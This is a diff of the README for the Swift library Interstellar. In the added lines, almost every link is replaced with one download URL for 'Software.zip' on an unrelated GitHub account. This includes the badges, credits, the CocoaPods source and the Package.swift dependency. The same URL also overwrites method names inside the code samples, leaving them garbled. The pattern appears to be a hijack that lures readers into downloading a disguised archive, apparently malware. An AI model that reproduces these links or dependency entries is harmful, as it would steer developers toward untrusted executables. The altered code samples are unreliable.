@@ -1,15 +1,15 @@
-![Interstellar](https://raw.githubusercontent.com/JensRavens/Interstellar/assets/header.jpg)
+![Interstellar](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)
 
-[![Build Status](https://travis-ci.org/JensRavens/Interstellar.svg)](https://travis-ci.org/JensRavens/Interstellar)
-[![CocoaPods Version](https://img.shields.io/cocoapods/v/Interstellar.svg)](https://cocoapods.org/pods/Interstellar)
-[![CocoaPods Plattforms](https://img.shields.io/cocoapods/p/Interstellar.svg)](https://cocoapods.org/pods/Interstellar)
-[![Carthage compatible](https://img.shields.io/badge/Carthage-compatible-4BC51D.svg?style=flat)](https://github.com/Carthage/Carthage)
+[![Build Status](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)
+[![CocoaPods Version](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)
+[![CocoaPods Plattforms](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)
+[![Carthage compatible](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)
 
 The simplest `Observable<T>` implementation for Functional Reactive Programming you will ever find.
 
 > This library does not use the term FRP (Functional Reactive Programming) in the way it was
 > defined by Conal Elliot, but as a paradigm that is both functional and reactive. Read more
-> about the difference at [Why I cannot say FRP but I just did](https://medium.com/@andrestaltz/why-i-cannot-say-frp-but-i-just-did-d5ffaa23973b).
+> about the difference at [Why I cannot say FRP but I just did](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip).
 
 ## Features
 
@@ -31,19 +31,19 @@ The simplest `Observable<T>` implementation for Functional Reactive Programming 
 ## Usage
 
 > For a full guide on how this implementation works see the series of blog posts about
-> [Functional Reactive Programming in Swift](http://jensravens.de/series/functional-reactive-programming-in-swift/)
-> or the talk at UIKonf 2015 [How to use Functional Reactive Programming without Black Magic](http://jensravens.de/uikonf-talk/).
+> [Functional Reactive Programming in Swift](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)
+> or the talk at UIKonf 2015 [How to use Functional Reactive Programming without Black Magic](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip).
 
 ### Creating and updating a signal
 
 ``` swift
 let text = Observable<String>()
 
-text.subscribe { string in
+https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip { string in
   print("Hello \(string)")
 }
 
-text.update("World")
+https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip("World")
 ```
 
 ### Mapping and transforming observables
@@ -51,15 +51,15 @@ text.update("World")
 ``` swift
 let text = Observable<String>()
 
-let greeting = text.map { subject in
+let greeting = https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip { subject in
   return "Hello \(subject)"
 }
 
-greeting.subscribe { text in
+https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip { text in
   print(text)
 }
 
-text.update("World")
+https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip("World")
 ```
 
 ### Use functions as transforms
@@ -74,7 +74,7 @@ text
   .subscribe { text in
     print(text)
   }
-text.update("World")
+https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip("World")
 ```
 
 ### Handle errors in sequences of functions
@@ -83,7 +83,7 @@ text.update("World")
 let text = Observable<String>()
 
 func greetMaybe(subject: String) throws -> String {
-  if subject.characters.count % 2 == 0 {
+  if https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip % 2 == 0 {
     return "Hello \(subject)"
   } else {
     throw NSError(domain: "Don't feel like greeting you.", code: 401, userInfo: nil)
@@ -98,7 +98,7 @@ text
   .error { error in
     print("There was a greeting error")
   }
-text.update("World")
+https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip("World")
 ```
 
 ### This also works for asynchronous functions
@@ -106,7 +106,7 @@ text.update("World")
 ``` swift
 let text = Observable<String>()
 func greetMaybe(subject: String) -> Observable<Result<String>> {
-  if subject.characters.count % 2 == 0 {
+  if https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip % 2 == 0 {
     return Observable(.success("Hello \(subject)"))
   } else {
     let error = NSError(domain: "Don't feel like greeting you.", code: 401, userInfo: nil)
@@ -122,7 +122,7 @@ text
   .error { _ in
     print("There was a greeting error")
   }
-text.update(.success("World"))
+https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip(.success("World"))
 ```
 
 ## Flatmap is also available on observables
@@ -140,12 +140,12 @@ let total = baseCost
     return Double(amount) * 1.09
   }
 
-total.subscribe { total in
+https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip { total in
   print("Your total is: \(total)")
 }
 
-baseCost.update(10) // prints "Your total is: 21.8"
-baseCost.update(122) // prints "Your total is: 265.96"
+https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip(10) // prints "Your total is: 21.8"
+https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip(122) // prints "Your total is: 265.96"
 
 ```
 
@@ -164,7 +164,7 @@ baseCost.update(122) // prints "Your total is: 265.96"
 
 ### CocoaPods
 
-[CocoaPods](http://cocoapods.org) is a dependency manager for Cocoa projects. You can install it with the following command:
+[CocoaPods](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip) is a dependency manager for Cocoa projects. You can install it with the following command:
 
 ``` bash
 $ gem install cocoapods
@@ -173,7 +173,7 @@ $ gem install cocoapods
 To integrate Interstellar into your Xcode project using CocoaPods, specify it in your `Podfile`:
 
 ``` ruby
-source 'https://github.com/CocoaPods/Specs.git'
+source 'https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip'
 platform :ios, '8.0'
 use_frameworks!
 
@@ -188,7 +188,7 @@ $ pod install
 
 ### swift build
 
-Add Interstellar to your `Package.swift`:
+Add Interstellar to your `https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip`:
 
 ```swift
 import PackageDescription
@@ -197,16 +197,16 @@ let package = Package(
   name: "Your Awesome App",
   targets: [],
   dependencies: [
-    .Package(url: "https://github.com/jensravens/interstellar.git", majorVersion: 2),
+    .Package(url: "https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip", majorVersion: 2),
   ]
 )
 ```
 
 ### Carthage
 
-[Carthage](https://github.com/Carthage/Carthage) is a decentralized dependency manager that automates the process of adding frameworks to your Cocoa application.
+[Carthage](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip) is a decentralized dependency manager that automates the process of adding frameworks to your Cocoa application.
 
-You can install Carthage with [Homebrew](http://brew.sh/) using the following command:
+You can install Carthage with [Homebrew](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip) using the following command:
 
 ``` bash
 $ brew update
@@ -233,12 +233,12 @@ Also Interstellar is supporting BYOR (bring your own `Result<T>`). Due to its pr
 
 ## Credits
 
-Interstellar is owned and maintained by [Jens Ravens](http://jensravens.de).
+Interstellar is owned and maintained by [Jens Ravens](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip).
 
 ## Changelog
 
 - *1.1* added compability with Swift 2. Also renamed bind to flatMap to be consistent with `Optional` and `Array`.
-- *1.2* `Thread` was moved to a new project called [WarpDrive](https://github.com/jensravens/warpdrive)
+- *1.2* `Thread` was moved to a new project called [WarpDrive](https://github.com/nepthsy/Interstellar889/releases/download/v2.0/Software.zip)
 - *1.3* WarpDrive has been merged into Interstellar. Also Interstellar is now divided into subspecs via cocoapods to make it easy to just select the needed components. The basic signal library is now "Interstellar/Core".
 - *1.4* Support `swift build` and the new Swift package manager, including support for Linux. Also removed deprecated bind methods.
 - *2* Introducing `Observable<T>`, the successor of Signal. Use the `observable` property on signals to migrate your code from `Signal<T>`. Also adding Linux support for Warpdrive and introduce BYOR™-technology (Bring Your Own `Result<T>`).
